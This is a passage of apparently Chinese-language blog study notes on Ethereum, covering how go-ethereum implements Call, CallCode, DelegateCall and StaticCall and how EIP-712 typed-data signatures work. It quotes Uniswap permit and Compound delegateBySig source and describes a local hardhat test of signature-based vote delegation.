<p>这是因为 <strong>「函数选择器」和参数的解析功能并不是由以太坊虚拟机的 go 代码码完成的，而是由<code>合约编译器</code>在编译时插入的代码完成了</strong>。</p>
<h1>合约调用的方法:</h1>
<p>EVM 对象实现合约的调用，有下面几种方法：</p>
<ol>
<li class="lvl-3">
<p>evm.Call()</p>
</li>
<li class="lvl-3">
<p>evm.CallCode()</p>
</li>
<li class="lvl-3">
<p>evm.DelegateCall()</p>
</li>
<li class="lvl-3">
<p>evm.StaticCall()</p>
</li>
</ol>
<p>后面三个的调用方式都是与 <code>evm.Call()</code> 比较产生的差异。</p>
<h2 id="CallCode-和DelegateCall">CallCode()和DelegateCall():</h2>
<p>首先需要了解的是，<strong><code>evm.CallCode</code> 和 <code>evm.DelegateCall</code> 的存在是为了实现合约的「库」的特性</strong>。</p>
<p>我们知道编程语言都有自己的库，比如 go 的标准库，C++ 的 STL 或 boost。<br />
作为合约的编写语言，solidity 也想有自己的库。<br />
但与普通语言的实现不同，solidity 写出来的代码要想作为库被调用，<strong>必须和普通合约一样，布署到区块链上取得一个固定的地址，其它合约才能调用这个「库合约」提供的方法。</strong></p>
<p><strong>但合约又涉及到一些特有的属性，比如<code>合约的调用者</code>、<code>自身地址</code>、<code>自身所拥有的以太币的数量</code>等。</strong></p>
<p>如果我们直接去调用「库合约」的代码，用到这些属性时必然是「库合约」自己的属性，但这可能不是我们想要的。<br />
例如，设想一个「库合约」的方法实现了一个这样的操作：从自已账户中给指定账户转一笔钱。<br />
如果这里的「自己账户」指的是「库合约」的账户，那肯定是不现实的（因为没有人会出钱布署一个有很多以太币的合约，并且让别人把这些币转走）。</p>
<p>此时 <code>evm.DelegateCall</code> 就派上用场了。<br />
这个调用方式将「库合约」的调用者，设置成自己的调用者；将「库合约」的地址，设置成自己的地址（但代码还是「库合约」的代码）。<br />
如此一来，「库合约」的属性，就完全和自己的属性一样了，「库合约」的代码就像是自己的写的代码一样。</p>
<p>例如</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>A 账户调用了 B 合约</p>
</li>
<li class="lvl-2">
<p>而在 B 合约中通过 <code>DelegateCall</code> 调用了 C 合约</p>
</li>
<li class="lvl-2">
<p>那么 C 合约的调用者将被修改成 A</p>
</li>
<li class="lvl-2">
<p>C 合约的地址将被修改成 B 合约的地址。</p>
</li>
</ul>
<p>所以在刚才用来转账的「库合约」的例子中，「自己账户」指的不再是「库合约」的账户了，而是调用「库合约」的账户，转账也就可以按我们想要的方式进行了。</p>
<p><code>CallCode</code> 与 <code>DelegateCall</code> 类似，不同的是 <code>CallCode</code> 不改变「库合约」的调用者，只是改变「库合约」的合约地址。<br />
也就是说，如果 A 通过 <code>CallCode</code> 的方式调用 B，那么 B 的调用者是 A，而 B 的账户地址也被改成了 A。</p>
<p>总结一下就是，<code>CallCode</code> 和 <code>DelegateCall</code> <strong>修改了被调用合约的上下文环境，可以让被调用的合约代码就像自己写的代码一样，从而达到「库合约」的目的</strong>。<br />
具体来说，<code>DelegateCall</code> 会修改被调用合约的调用者和合约本身的地址，而 <code>CallCode</code> 只会修改被调用合约的本身的地址。</p>
<p>了解了这两个方法的目的和功能，我们来看看代码中它们是如何实现各自的功能的。<br />
对于 <code>evm.CallCode</code> 来说，它通过下面展示的几行代码来修改被调用合约的地址：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(evm *EVM)</span></span> CallCode(caller ContractRef, addr common.Address, input []<span class="type">byte</span>, gas <span class="type">uint64</span>, value *big.Int) (ret []<span class="type">byte</span>, leftOverGas <span class="type">uint64</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">	... </span><br><span class="line">	contract := NewContract(caller, AccountRef(caller.Address()), value, gas) <span class="comment">// !!!</span></span><br><span class="line">	contract.SetCallCode(&amp;addrCopy, evm.StateDB.GetCodeHash(addrCopy), evm.StateDB.GetCode(addrCopy))</span><br><span class="line">	ret, err = evm.interpreter.Run(contract, input, <span class="literal">false</span>)</span><br><span class="line">	gas = contract.Gas</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，在利用现有数据生成一个合约对象时，将合约对象的地址 <code>to</code> 变量设置成调用者，也就是 <code>caller</code> 的地址。<br />
对于 <code>evm.DelegateCall</code> 来说，它是通过下面几行代码修改被调用合约的调用者和自身地址的：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(evm *EVM)</span></span> DelegateCall(caller ContractRef, addr common.Address, input []<span class="type">byte</span>, gas <span class="type">uint64</span>) (ret []<span class="type">byte</span>, leftOverGas <span class="type">uint64</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">// to 变量设置为caller 的地址</span></span><br><span class="line">	contract := NewContract(caller, AccountRef(caller.Address()), <span class="literal">nil</span>, gas).AsDelegate()</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Contract)</span></span> AsDelegate() *Contract &#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">NOTE:</span> caller must, at all times be a contract. It should never happen</span></span><br><span class="line">	<span class="comment">// that caller is something other than a Contract.</span></span><br><span class="line">	parent := c.caller.(*Contract)</span><br><span class="line">	c.CallerAddress = parent.CallerAddress</span><br><span class="line">	c.value = parent.value</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里首先也是通过将 to 变量设置成调用者，也就是 caller 的地址，达到修改被调用合约的自身地址的目的。<br />
被调用合约的调用者是通过 <code>Contract.AsDelegate</code> 修改的。<br />
这个方法里，将合约的调用者地址 <code>CallerAddress</code> 设置成目前调用者的 <code>CallerAddress</code>，也即 当前调用者的调用者的地址（有些绕，仔细看一下就能明白）。</p>
<h2 id="三种调用方法的比较">三种调用方法的比较:</h2>
<h3 id="Call">Call():</h3>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">to = AccountRef(addr)</span><br><span class="line">contract := NewContract(caller, to, value, gas)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 假设有外部账户A，合约账户B和合约账户C</span></span><br><span class="line">A Call B ——&gt; ContractB</span><br><span class="line">CallerAddress: A</span><br><span class="line">Caller:        A</span><br><span class="line">self:          B</span><br><span class="line"> </span><br><span class="line">B Call C ——&gt; ContractC</span><br><span class="line">CallerAddress: B</span><br><span class="line">Caller:        B</span><br><span class="line">self:          C</span><br></pre></td></tr></table></figure>
<h3 id="CallCode">CallCode():</h3>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">to = AccountRef(caller.Address())</span><br><span class="line">contract := NewContract(caller, to, value, gas)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 假设有外部账户A，合约账户B和合约账户C</span></span><br><span class="line">A Call B ——&gt; ContractB</span><br><span class="line">CallerAddress: A</span><br><span class="line">Caller:        A</span><br><span class="line">self:          B</span><br><span class="line"> </span><br><span class="line">B Callcode C ——&gt; ContractC</span><br><span class="line">CallerAddress: B</span><br><span class="line">Caller:        B</span><br><span class="line">self:          B</span><br></pre></td></tr></table></figure>
<h3 id="delegateCall">delegateCall():</h3>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">to = AccountRef(caller.Address())</span><br><span class="line">contract := NewContract(caller, to, <span class="literal">nil</span>, gas).AsDelegate()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Contract)</span></span> AsDelegate() *Contract &#123;</span><br><span class="line">	parent := c.caller.(*Contract)</span><br><span class="line">	c.CallerAddress = parent.CallerAddress</span><br><span class="line">	c.value = parent.value</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 假设有外部账户A，合约账户B和合约账户C</span></span><br><span class="line">A Call B ——&gt; ContractB</span><br><span class="line">CallerAddress: A</span><br><span class="line">Caller:        A</span><br><span class="line">self:          B</span><br><span class="line"> </span><br><span class="line">B DelegateCall C ——&gt; ContractC</span><br><span class="line">CallerAddress: A</span><br><span class="line">Caller:        B</span><br><span class="line">self:          B</span><br></pre></td></tr></table></figure>
<p>从代码上看，这三者的主要区别就是这一点，主要就是在contract对象中的<code>callerAddress</code>、<code>caller</code>和<code>self</code>这三个的值不同。</p>
<p>如果外部账户A的某个操作通过<code>Call</code>方法调用B合约，而B合约又通过<code>Call</code>方法调用了C合约，那么最后实际上修改的是合约C账户的值；<br />
如果外部账户A的某个操作通过<code>Call</code>方法调用B合约，而B合约通过<code>CallCode</code>方法调用了C合约，那么B只是调用了C中的函数代码，而最终改变的还是合约B账户的值。</p>
<p><code>DelegateCall</code>其实跟CallCode方法的目的类似，都是只调用指定地址（合约C）的代码，而操作B的值。<br />
<strong>只不过它明确了CallerAddress是来自A，而不是B。</strong></p>
<p>所以这两种方法都可以用来实现动态库：即你调用我的函数和方法改动的都是你自己的数据。</p>
<h2 id="连环调用">连环调用:</h2>
<p>我们说过智能合约EVM的递归调用深度为1024，也就是指通过一个合约调用另一个合约，像这样的调用可以递归1024次。</p>
<p>为什么说是“递归”？因为从一个智能合约调用另一个智能合约，比如通过<code>Call()</code>方法，都要重新构建<code>contract</code>实例，然后执行<code>run()</code>。<br />
而<code>run()</code>的执行是通过<code>EVMinterpreter.Run()</code>进行的。而在<code>EVMInterpreter</code>结构体中又传入了<code>*EVM</code>的地址，然后执行了<code>evm.depth++</code>。<br />
<strong>所以实际上每一次调用都是在同一个EVM内进行的。</strong></p>
<h2 id="StaticCall">StaticCall():</h2>
<p><code>evm.StaticCall</code> 与 <code>evm.Call</code> 类似，唯一不同的是 <strong><code>StaticCall</code> 不允许执行会修改永久存储的数据的指令</strong>。<br />
如果执行过程中遇到这样的指令，就会失败。</p>
<blockquote>
<p><code>StaticCall</code> 是如何实现拒绝执行会修改永久存储数据的指令的呢？</p>
</blockquote>
<p><code>StaticCall</code>调用解释器执行时，会传入<code>readOnly</code>为<code>true</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(evm *EVM)</span></span> StaticCall(caller ContractRef, addr common.Address, input []<span class="type">byte</span>, gas <span class="type">uint64</span>) (ret []<span class="type">byte</span>, leftOverGas <span class="type">uint64</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">	contract := NewContract(caller, AccountRef(addrCopy), <span class="built_in">new</span>(big.Int), gas)</span><br><span class="line">	contract.SetCallCode(&amp;addrCopy, evm.StateDB.GetCodeHash(addrCopy), evm.StateDB.GetCode(addrCopy))</span><br><span class="line">	<span class="comment">// run 函数的最后一个参数 readOnly 为 true</span></span><br><span class="line">	ret, err = evm.interpreter.Run(contract, input, <span class="literal">true</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在解释器的 <code>EVMInterpreter.Run</code> 方法中,会记录<code>readOnly</code>参数</p>
<figure class="highlight go"><figcaption><span>core/vm/interpreter.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(in *EVMInterpreter)</span></span> Run(contract *Contract, input []<span class="type">byte</span>, readOnly <span class="type">bool</span>) (ret []<span class="type">byte</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Make sure the readOnly is only set if we aren&#x27;t in readOnly yet.</span></span><br><span class="line">	<span class="comment">// This also makes sure that the readOnly flag isn&#x27;t removed for child calls.</span></span><br><span class="line">	<span class="comment">// 将readOnly设置为true</span></span><br><span class="line">	<span class="keyword">if</span> readOnly &amp;&amp; !in.readOnly &#123;</span><br><span class="line">		in.readOnly = <span class="literal">true</span></span><br><span class="line">		<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; in.readOnly = <span class="literal">false</span> &#125;()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解释器的执行过程中：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>根据<code>pc</code>取指令</p>
</li>
<li class="lvl-2">
<p>根据指令从<code>JumpTable</code>中获得操作码</p>
</li>
<li class="lvl-2">
<p>在<code>instructions.go</code>中，找到执行操作码的具体实现函数，对堆栈进行操作</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220724225445.png" alt="20220724225445" /></p>
<p>在部分操作码(<code>opSstore</code>、<code>opCreate</code>、<code>opCreate2</code>、<code>opCall</code>、<code>opSelfdestruct</code>)对应的实现函数中，会对<code>readOnly</code>参数进行检查</p>
<figure class="highlight go"><figcaption><span>core/vm/instructions.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">opSstore</span><span class="params">(pc *<span class="type">uint64</span>, interpreter *EVMInterpreter, scope *ScopeContext)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> interpreter.readOnly &#123;   <span class="comment">// 检查只读</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, ErrWriteProtection</span><br><span class="line">	&#125;</span><br><span class="line">	loc := scope.Stack.pop()</span><br><span class="line">	val := scope.Stack.pop()</span><br><span class="line">	interpreter.evm.StateDB.SetState(scope.Contract.Address(),</span><br><span class="line">		loc.Bytes32(), val.Bytes32())</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://blog.csdn.net/lj900911/article/details/84929280">以太坊源码解读（20）通过EVM执行转账或合约调用——Call（）</a></p>
</li>
<li class="lvl-2">
<p><a href="http://yangzhe.me/2019/08/12/ethereum-evm/#%E8%B0%83%E7%94%A8%E5%90%88%E7%BA%A6">http://yangzhe.me/2019/08/12/ethereum-evm/#调用合约</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
        <tag>BlockChain</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-使用EIP-712签名进行委托和投票</title>
    <url>/2022/58092.html</url>
    <content><![CDATA[<h1>使用ECDSA签名并验证:</h1>
<h2 id="什么是ECDSA">什么是ECDSA:</h2>
<p>ECDSA可理解为以太坊、比特币对消息、交易进行签名与验证的算法与流程。</p>
<h2 id="流程-3">流程:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>签名即<code>正向算法（消息 + 私钥 + 随机数）= 签名</code>，其中消息是公开的，私钥是隐私的，经过ECDSA正向算法可得到<code>签名，即r、s、v</code></p>
</li>
<li class="lvl-2">
<p>验证即<code>反向算法（消息 + 签名）= 公钥</code>，其中消息是公开的，签名是公开的，经过ECDSA反向算法可得到公钥，然后对比已公开的公钥。</p>
</li>
</ul>
<h2 id="签名交易-2">签名交易:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221116112417.png" alt="20221116112417" /></p>
<h1>签名方法分类:</h1>
<p>可以把签名方法划分为三种：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>通用消息签名方法；</p>
</li>
<li class="lvl-2">
<p>EIP-191标准签名方法；</p>
</li>
<li class="lvl-2">
<p>EIP-712标准签名方法；</p>
</li>
</ul>
<p>通用签名方法就是添加了<code>&quot;\x19Ethereum Signed Message:\n&quot;</code>这个字符串的签名，如metamask的<code>personal_sign</code>方法和ECDSA库的<code>toEthSignedMessageHash</code>方法，添加这个字符串只是单纯的为了表明这是以太坊的签名。</p>
<p>EIP-191提出了在签名中加入合约自身的address参数，以防止重放攻击的手法。</p>
<blockquote>
<p>主要学习一下EIP-712</p>
</blockquote>
<h1>EIP-712:</h1>
<h2 id="为什么要使用EIP712">为什么要使用EIP712:</h2>
<p>该EIP主要针对两个问题：</p>
<ol>
<li class="lvl-3">
<p>提高链下消息签名在链上使用的可用性，节省gas；</p>
</li>
<li class="lvl-3">
<p>让用户知道他们在给什么数据进行签名。</p>
</li>
</ol>
<p>在传统的dapp签名中，用户看到的往往是一串十六进制的数据，如下图：<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221116112629.png" alt="20221116112629" /><br />
而EIP712强调了一种对数据及其结构进行编码的方案，该方案允许在签名时将其显示给用户进行验证，让用户清楚的知道他们将要签署什么样的数据，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221116112649.png" alt="20221116112649" /></p>
<h2 id="EIP-712-结构解析">EIP-712 结构解析:</h2>
<p>对比我们上述&quot;通用消息签名方法&quot;中<code>只是对要签名的参数进行序列化、keccak256、添加&quot;\x19Ethereum Signed Message:\n32&quot;后再次序列化与keccak256、签名</code>相比，EIP-712是有着结构化上的要求的。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221116114338.png" alt="20221116114338" /></p>
<p>EIP712最终的可签名的hash生成公式：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">encode</span>(domainSeparator : bytes32, message : <span class="title class_">Struct</span>) = <span class="string">&quot;x19x01&quot;</span> ‖ domainSeparator ‖ <span class="title function_">hashStruct</span>(message)</span><br></pre></td></tr></table></figure>
<p>这里的encode处理就是将<code>&quot;x19x01&quot;</code>、<code>domainSeparator</code>和<code>hashStruct(message)</code>拼接在一起。</p>
<blockquote>
<p>看看<code>domainSeparator</code>和<code>hashStruct(meaasge)</code>具体实现。</p>
</blockquote>
<h2 id="签名域domainSeparator">签名域domainSeparator:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>作用主要是保证不同的合约和链上的签名是不同的、隔离的。</p>
</li>
</ul>
<blockquote>
<p>两个 DApp 可能会产生相同的结构，这样<code>Transfer(address from,address to,uint256 amount)</code>就不应该兼容。通过引入域分隔符，dApp 开发人员可以保证不会出现签名冲突。</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>domainSeparator</code>由两部分组成，第一部分为对结构体的keccak256（encodeType），第二部分为结构体的具体实现（encodeData）；</p>
</li>
<li class="lvl-2">
<p><code>domainSeparator</code>结构体如下所示，一般来说salt（随机数）会省略；</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">struct <span class="title class_">EIP712Domain</span>&#123;</span><br><span class="line">	string name, <span class="comment">//用户可读的域名，如DAPP的名字</span></span><br><span class="line">	string version, <span class="comment">// 目前签名的域的版本号</span></span><br><span class="line">	uint256 chainId, <span class="comment">// EIP-155中定义的chain ID， 如以太坊主网为1</span></span><br><span class="line">	address verifyingContract, <span class="comment">// 用于验证签名的合约地址</span></span><br><span class="line">	bytes32 salt <span class="comment">// 随机数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>encodeType</code>与<code>encodeData</code>都要按照如上的结构体顺序来实现，其中字段可以省略，但不可以颠倒顺序</p>
</li>
<li class="lvl-2">
<p>针对string 或者 bytes 等动态类型，即长度不定的类型，其取值为 <code>keccak256(string) 、 keccak256(bytes)</code> 即内容的hash值；</p>
</li>
<li class="lvl-2">
<p>我们可以看到这里用的是<code>abi.encode</code>而非<code>abi.encodePacked</code>，这是因为<code>domainSeparator</code>结构体要求每个字段占据256位，以便于前端分割。</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">DOMAIN_SEPARATOR</span> = <span class="title function_">keccak256</span>(</span><br><span class="line">        abi.<span class="title function_">encode</span>(</span><br><span class="line">            <span class="comment">// encodeType</span></span><br><span class="line">            <span class="title function_">keccak256</span>(<span class="string">&#x27;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)&#x27;</span>),</span><br><span class="line">            <span class="comment">// encodeData</span></span><br><span class="line">          	<span class="title function_">keccak256</span>(<span class="title function_">bytes</span>(name)),</span><br><span class="line">            <span class="title function_">keccak256</span>(<span class="title function_">bytes</span>(<span class="string">&#x27;1&#x27;</span>)),</span><br><span class="line">            chainId,</span><br><span class="line">            <span class="title function_">address</span>(<span class="variable language_">this</span>)</span><br><span class="line">        )</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
<h2 id="签名对象hashStruct-message">签名对象hashStruct(message):</h2>
<p>一般来讲，<code>hashStruct(message)</code>与<code>domainSeparator</code>格式相同，也是由两部分组成，第一部分为对<code>自定义结构体的keccak256（encodeType）</code>，第二部分为<code>自定义结构体的具体实现（encodeData）</code>；</p>
<p>由注释可知，PERMIT_TYPEHASH就是<code>Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)</code>的hash，注意自定义对象名要首字母大写；<br />
encodeData与encodeType顺序要相同；</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2ERC20.sol</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// keccak256(&quot;Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)&quot;);</span></span><br><span class="line">bytes32 public constant <span class="variable constant_">PERMIT_TYPEHASH</span> = <span class="number">0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">permit</span>(<span class="params">address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(deadline &gt;= block.<span class="property">timestamp</span>, <span class="string">&#x27;UniswapV2: EXPIRED&#x27;</span>);</span><br><span class="line">        <span class="comment">// 签名摘要</span></span><br><span class="line">        bytes32 digest = <span class="title function_">keccak256</span>( </span><br><span class="line">            abi.<span class="title function_">encodePacked</span>(</span><br><span class="line">                <span class="string">&#x27;\x19\x01&#x27;</span>, <span class="comment">// 固定前缀</span></span><br><span class="line">                <span class="variable constant_">DOMAIN_SEPARATOR</span>, <span class="comment">// 域名分隔符</span></span><br><span class="line">                <span class="title function_">keccak256</span>(abi.<span class="title function_">encode</span>(<span class="variable constant_">PERMIT_TYPEHASH</span>, owner, spender, value, nonces[owner]++, deadline)) <span class="comment">//签名对象</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        address recoveredAddress = <span class="title function_">ecrecover</span>(digest, v, r, s);</span><br><span class="line">        <span class="built_in">require</span>(recoveredAddress != <span class="title function_">address</span>(<span class="number">0</span>) &amp;&amp; recoveredAddress == owner, <span class="string">&#x27;UniswapV2: INVALID_SIGNATURE&#x27;</span>);</span><br><span class="line">        <span class="title function_">_approve</span>(owner, spender, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="小结-3">小结:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>签名域domainSeparator</code>: 该签名可用于哪个链的哪个合约,限定的范围</p>
</li>
<li class="lvl-2">
<p><code>签名对象hashStruct(message)</code>: 该msg用于哪个具体的函数</p>
</li>
</ul>
<p>其中<code>r,s,v</code>就相当于是签名</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sig = signature.<span class="property">value</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> r = <span class="string">&#x27;0x&#x27;</span> + sig.<span class="title function_">substring</span>(<span class="number">2</span>).<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line"><span class="keyword">const</span> s = <span class="string">&#x27;0x&#x27;</span> + sig.<span class="title function_">substring</span>(<span class="number">2</span>).<span class="title function_">substring</span>(<span class="number">64</span>, <span class="number">128</span>);</span><br><span class="line"><span class="keyword">const</span> v = <span class="string">&#x27;0x&#x27;</span> + sig.<span class="title function_">substring</span>(<span class="number">2</span>).<span class="title function_">substring</span>(<span class="number">128</span>, <span class="number">130</span>);</span><br></pre></td></tr></table></figure>
<h1>Compound委托实例:</h1>
<blockquote>
<p>通过实例来加深理解。教程: <a href="https://medium.com/compound-finance/delegation-and-voting-with-eip-712-signatures-a636c9dfec5e">https://medium.com/compound-finance/delegation-and-voting-with-eip-712-signatures-a636c9dfec5e</a></p>
<p><a href="https://github.com/compound-developers/compound-governance-examples/blob/master/signature-examples/batch-publish-examples/README.md">https://github.com/compound-developers/compound-governance-examples/blob/master/signature-examples/batch-publish-examples/README.md</a></p>
</blockquote>
<p>通过签名功能的用户的一个主要好处是他们可以免费创建签名委托或投票交易，并让受信任的第三方花费 ETH 支付gas费并将其写入区块链。</p>
<h2 id="步骤">步骤:</h2>
<p>测试代码:<code>https://github.com/jerrychan807/my-awesome-solidity/blob/main/sign/README.md</code></p>
<h3 id="部署Compound代币合约">部署Compound代币合约:</h3>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动本地节点</span></span><br><span class="line">yarn hardhat node</span><br><span class="line"><span class="comment"># 部署在本地</span></span><br><span class="line">yarn hardhat deploy --network localhost</span><br></pre></td></tr></table></figure>
<p>部署完Compound代币合约后，编写转账用例,AB用户均持有<code>comp</code>代币</p>
<h3 id="启动http服务器">启动http服务器:</h3>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python -m http.server</span><br></pre></td></tr></table></figure>
<p>用户A在链下创建签名<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221115174725.png" alt="20221115174725" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221115184807.png" alt="20221115184807" /></p>
<p>接着把签名数据给用户B，由用户B去支付gas写入链上。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 测试结果</span></span><br><span class="line">hardhat <span class="built_in">test</span> <span class="built_in">test</span>/Token.test.ts --network localhost</span><br><span class="line">  Token contract</span><br><span class="line">    contract tests1</span><br><span class="line">normalAddr1DelegatesBalance : 0.0</span><br><span class="line">normalAddr2DelegatesBalance : 642829559307850963015472508762.062935916233390536</span><br><span class="line">adminDelegatesBalance : 0.0</span><br></pre></td></tr></table></figure>
<p>实现了用户A在链上免费生成签名,再由别的用户付gas fee写到链上。</p>
<h2 id="源码">源码:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// https://etherscan.io/address/0xc00e94Cb662C3520282E6f5717214004A7f26888#code</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// @notice The EIP-712 typehash for the delegation struct used by the contract</span></span><br><span class="line">bytes32 public constant <span class="variable constant_">DELEGATION_TYPEHASH</span> = <span class="title function_">keccak256</span>(<span class="string">&quot;Delegation(address delegatee,uint256 nonce,uint256 expiry)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@notice</span> Delegates votes from signatory to `delegatee`</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> delegatee The address to delegate votes to 委托目的地址</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> nonce The contract state required to match the signature</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> expiry The time at which to expire the signature 过期时间</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> v The recovery byte of the signature</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> r Half of the ECDSA signature pair</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> s Half of the ECDSA signature pair</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">delegateBySig</span>(<span class="params">address delegatee, uint nonce, uint expiry, uint8 v, bytes32 r, bytes32 s</span>) public &#123;</span><br><span class="line">    bytes32 domainSeparator = <span class="title function_">keccak256</span>(abi.<span class="title function_">encode</span>(<span class="variable constant_">DOMAIN_TYPEHASH</span>, <span class="title function_">keccak256</span>(<span class="title function_">bytes</span>(name)), <span class="title function_">getChainId</span>(), <span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">    bytes32 structHash = <span class="title function_">keccak256</span>(abi.<span class="title function_">encode</span>(<span class="variable constant_">DELEGATION_TYPEHASH</span>, delegatee, nonce, expiry));</span><br><span class="line">    <span class="comment">// 签名</span></span><br><span class="line">    bytes32 digest = <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(<span class="string">&quot;\x19\x01&quot;</span>, domainSeparator, structHash));</span><br><span class="line">    <span class="comment">// 签名反向算法得出 委托人地址</span></span><br><span class="line">    address signatory = <span class="title function_">ecrecover</span>(digest, v, r, s);</span><br><span class="line">    <span class="built_in">require</span>(signatory != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;Comp::delegateBySig: invalid signature&quot;</span>);</span><br><span class="line">    <span class="built_in">require</span>(nonce == nonces[signatory]++, <span class="string">&quot;Comp::delegateBySig: invalid nonce&quot;</span>);</span><br><span class="line">    <span class="built_in">require</span>(now &lt;= expiry, <span class="string">&quot;Comp::delegateBySig: signature expired&quot;</span>);</span><br><span class="line">    <span class="comment">// 委托人 委托给 目的地址</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_delegate</span>(signatory, delegatee);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://learnblockchain.cn/article/5012">一文读懂以太坊签名：ECDSA、RLP、EIP155、EIP191、EIP712</a></p>
</li>
<li class="lvl-2">
<p><a href="https://cn-sec.com/archives/1107298.html">以太坊标准——EIP712</a></p>
</li>
<li class="lvl-2">
